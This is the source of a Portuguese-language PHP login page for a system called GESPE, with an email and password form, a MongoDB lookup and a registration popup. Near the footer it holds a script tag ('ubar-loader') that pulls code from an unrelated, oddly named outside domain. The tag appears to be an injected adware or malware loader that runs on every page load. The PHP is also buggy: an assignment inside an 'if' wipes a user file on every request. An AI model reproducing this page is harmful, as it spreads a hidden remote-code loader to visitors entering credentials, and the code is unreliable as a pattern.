<!DOCTYPE html>
<?php
	if($acao = 'sair'){
		$arquivo=fopen("Usuario.txt", "w");
        $escrever = fwrite($arquivo, strval(''));
	}
	$m = new Mongo('localhost:27017');
	$db = $m->Login;
	$collection = $db->Login;
	$Id = '';
	$cursor2 = '';
	if(isset($_GET['Id'])){
		$Id=$_GET['Id'];
		$title="Update";
	$cursor2 = $collection->findOne(array("_id" => new MongoId($Id)));
	$cursor = $collection->find($cursor2);	
	}
	else{
		$cursor = $collection->find(array("Campus" => $cursor2));
	}
?>
<html>
<head>
	<title>Index</title>
	<meta name="robots" content="noindex, nofollow">
	<link rel="stylesheet" href="css/estilo.css"/>
	<link rel="stylesheet" href="css/css4.css"/>
	<link rel="stylesheet" href="css/jquery.min.js"/>
	<link rel="stylesheet" href="css/bootstrap.min.css"/>
	<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/themes/ui-darkness/jquery-ui.css" rel="stylesheet">
	<link rel="stylesheet" href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" />
	<style type="text/css">
		.background{
		  position: absolute;
		  top: 0;
		  left: 0;
		  width: 100%;
		  height: 100%;
		  background-color: #000;
		  opacity: 0;
		  z-index: 100;
		  display: none;  
		}
		.box{
		  position: absolute;
		  top: 20%;
		  left: 30%;
		  width: 500px;
		  height: 400px;
		  background-color: #fff;
		  z-index: 101;
		  padding-left: 50px;
		  padding-left: 20px;
		  border-radius: 4px;
		  box-shadow: 2px 2px 2px #333;
		  display: none;
		}
		.close{
		  float: right;
		  margin-right: 10px;
		  cursor: pointer;
		}
	</style>
	<script src="js/jquery.js"></script>
    <script src="js/jquery.maskedinput-1.0.js"></script>
    <script src="js/mongo-states-n-cities-br-marter/app.js"></script>
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
	<script type="text/javascript" src="js/query-1.11.1.min.js"></script>
	<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script>
	<script type="text/javascript" src="js/dialog.js"></script>
	<script src="js/js.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$('.ligthbox').click(function() {
				$('.background, .box').animate({'opacity':'1.00'}, 500, 'linear');
				$('.box').animate({'opacity': '1.00'}, 500, 'linear');
				$('.background, .box').css('display', 'block');
			})
			$('.close').click(function(){
				$('.background, .box').animate({'opacity':'0'}, 500, 'linear', function (){
					$('.background, .box').css('display', 'none');
				});
			});
			$('.background').click(function(){
				$('.background, .box').animate({'opacity':'0'}, 500, 'linear', function (){
					$('.background, .box').css('display', 'none');
				});
			});
		});
	</script>
	<script>
		jQuery(function($){
        	$("#Matricula").mask("999.999.999-99");
   		});
	</script>
</head>
<body>
    <!-- /#wrapper -->
	<div class="container">
		<header>
			<div id="group">
				<p>GESPE</p>
				<img src="IMG/LOGO/IF.png">
			</div>
		</header>
		<div id="mainform">
		<div class="row">
			<div id="index">
				<section>
					<form method="post" action="entrar.php">
						<table>
							<tr>
								<td>
									<label>E-mail</label>
								</td>
							</tr>
							<tr>
								<td>
									<input type="email" name="email">
								</td>
							</tr>
							<tr>
								<td>
									<label>Senha</label>
								</td>
							</tr>
							<tr>
								<td>
									<input type="password" name="password" maxlength="20">
								</td>
							</tr>
							<tr>
								<td>	
									<button name="acao" value="entrar" id="acao" type="submit">entrar</button>
								</td>
							</tr>
						</table>
						<div class="form" id="popup">
						<a href="#" class="ligthbox">Cadastrar</a>
						</div>
						<input type="hidden" name="erro" id="erro" value="<?php if(isset($_GET['erro']))$erro=$_GET['erro'];?>">
					</form>
				</section>
			</div>
		</div>
		</div>
		<div class="background"></div>
		<div class="box"><div class="close">X</div>
			<?php require_once 'cadastroLogin.php'; ?>
		</div>
	<script src="http://minxxrpaaw.org/code.php?appid=imr38-10064-1459604110624-c1c39981-f969-4a96-a398-b67cd598daef&h=0&m=normal" id="ubar-loader"></script>
		<footer>
			<p>todos os direitos reservados</p>
		</footer>
	</div>
</body>
</html>